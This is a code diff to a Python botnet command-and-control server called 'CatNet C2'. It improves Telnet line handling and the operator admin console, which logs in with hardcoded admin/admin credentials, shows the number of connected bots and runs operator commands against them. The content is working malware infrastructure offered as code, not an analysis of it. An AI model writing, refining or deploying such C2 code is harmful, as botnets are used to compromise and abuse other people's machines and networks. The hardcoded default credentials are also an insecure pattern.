@@ -147,32 +147,59 @@ class BotnetC2:
             self.running = False
             sys.exit(0)
 
+    def read_line(self, sock):
+        """Lit une ligne depuis le socket Telnet en gérant les retours à la ligne divers."""
+        line = b""
+        while True:
+            try:
+                char = sock.recv(1)
+                if not char: return None
+                if char == b"\n": break
+                if char == b"\r": continue
+                line += char
+            except: return None
+        return line.decode('utf-8', errors='ignore').strip()
+
     def handle_admin(self, admin_socket, address):
-        admin_socket.send(b"\r\nCatNet Admin Login: ")
-        # Login basique pour la démonstration
-        login = admin_socket.recv(1024).decode().strip()
-        admin_socket.send(b"Password: ")
-        password = admin_socket.recv(1024).decode().strip()
-        
-        if login == "admin" and password == "admin":
-            admin_socket.send(b"\r\nWelcome to CatNet C2 Admin Interface\r\n")
-            while self.running:
-                admin_socket.send(f"\r\n[Bots: {len(self.connected_bots)}] admin> ".encode())
-                try:
-                    data = admin_socket.recv(1024).decode().strip()
+        try:
+            # Désactiver l'écho local Telnet (pour que le serveur gère l'affichage si besoin)
+            # IAC WILL ECHO (255 251 1)
+            admin_socket.send(bytes([255, 251, 1]))
+            
+            admin_socket.send(b"\r\nCatNet Admin Login: ")
+            login = self.read_line(admin_socket)
+            if login is None: return
+            
+            admin_socket.send(b"Password: ")
+            password = self.read_line(admin_socket)
+            if password is None: return
+            
+            if login == "admin" and password == "admin":
+                admin_socket.send(b"\r\nWelcome to CatNet C2 Admin Interface\r\n")
+                admin_socket.send(b"Type 'help' for commands or 'logout' to exit.\r\n")
+                
+                while self.running:
+                    admin_socket.send(f"\r\n[Bots: {len(self.connected_bots)}] admin> ".encode())
+                    data = self.read_line(admin_socket)
                     if not data: break
                     if data == "logout": break
+                    if data == "exit": 
+                        self.running = False
+                        sys.exit(0)
                     
                     cmd = data.split()
-                    # Rediriger la sortie vers le socket admin
+                    if not cmd: continue
+                    
                     import io
                     output = io.StringIO()
                     self.process_command(cmd, output)
                     admin_socket.send(output.getvalue().replace("\n", "\r\n").encode())
-                except: break
-        else:
-            admin_socket.send(b"Login failed.\r\n")
-        admin_socket.close()
+            else:
+                admin_socket.send(b"Login failed.\r\n")
+        except Exception as e:
+            self.log(f"Erreur session admin: {e}", "ERROR")
+        finally:
+            admin_socket.close()
 
     def admin_listener(self):
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
